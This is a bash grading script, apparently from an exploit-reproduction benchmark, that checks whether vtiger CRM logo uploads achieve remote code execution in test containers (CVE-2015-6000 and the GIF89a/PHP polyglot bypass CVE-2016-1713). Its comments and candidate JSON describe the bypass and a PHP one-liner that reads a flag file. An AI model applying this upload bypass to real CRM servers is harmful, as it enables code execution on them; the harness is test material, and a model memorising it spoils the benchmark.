#!/usr/bin/env bash
# verify.sh --seed|--residual — vtiger CRM company-logo upload RCE (CVE-2015-6000 -> CVE-2016-1713)
#   --seed     : 明文 PHP logo 上传 (CVE-2015-6000, content_kind=plain_php)
#                -> V0(6.3.0) 无服务端 mime 嗅探，落盘 test/logo/*.php 并执行 -> 达效果
#                -> V1(6.4.0) 新增 mime_content_type 嗅探，text/plain 被拒 (error=LBL_INVALID_IMAGE) -> 拦截
#   --residual : GIF/PHP polyglot 上传 (CVE-2016-1713, content_kind=gif_polyglot, GIF89a 魔数前缀)
#                -> V1 上满足新增的 mime 嗅探 (image/gif) 且保留 .php 扩展名 -> 落盘并执行 -> 达效果
# flag 通道: 容器启动时在 /flag/pcb_flag.txt (docroot 外) 植入 ${PCB_FLAG}；只有被执行的 .php
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

#            (<?=@file_get_contents('/flag/pcb_flag.txt')?>) 能读出。seed_exec.py 输出 JSON 的
#            'fetched_body' 字段 = GET /test/logo/<fname> 的响应体（含 flag 或为空）。
# 判定基准: RUN_FLAG_REF（回退 RUN_FLAG）。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
REF="$RUN_FLAG"
mkdir -p "$WORK_DIR"

# candidate 构造（seed 直接取公开 original_poc；residual 独立实现 polyglot 语义）
if [[ "$MODE" == "--seed" ]]; then
  "$PY" - "$CASE_DIR/poc" > "$WORK_DIR/cand.json" <<'PYEOF'
import sys, json
sys.path.insert(0, sys.argv[1])
import original_poc
print(json.dumps(original_poc.candidate()))
PYEOF
else
  "$PY" - > "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
print(json.dumps({
    "probe_id": "cve-2016-1713-companydetails-logo-gif-polyglot",
    "mode": "logo_upload",
    "filename": "pcb_bypass.php",
    "content_kind": "gif_polyglot",   # GIF89a 魔数 + <?=...?>：过 mime_content_type 嗅探，仍以 .php 执行
    "content_type": "image/gif",
}))
PYEOF
fi

# seed_exec.py 经 requests 直连宿主端口 39460/39461，无需 compose 上下文。
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 800; echo

# 判定: probe 报错(登录/表单 token 失败等) -> 环境失败；fetched_body 含真 flag -> 达效果；
#       blocked_by_guard 或 404/空体 -> 未发生。
"$PY" - "$OUT" <<'PYEOF'
import json, os, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    print("verify: bad executor output", file=sys.stderr)
    sys.exit(20)
if d.get("error"):
    print("verify: probe error (env):", str(d["error"])[:300], file=sys.stderr)
    sys.exit(20)
ref = os.environ.get("RUN_FLAG") or os.environ["RUN_FLAG_REF"]
body = d.get("fetched_body") or ""
if ref in body:
    sys.exit(0)
if d.get("blocked_by_guard") or d.get("fetch_status") == 404:
    print("verify: upload blocked by guard / file not served (effect not observed)")
    sys.exit(10)
print("verify: no flag in fetched body (status=%s)" % d.get("fetch_status"))
sys.exit(10)
PYEOF
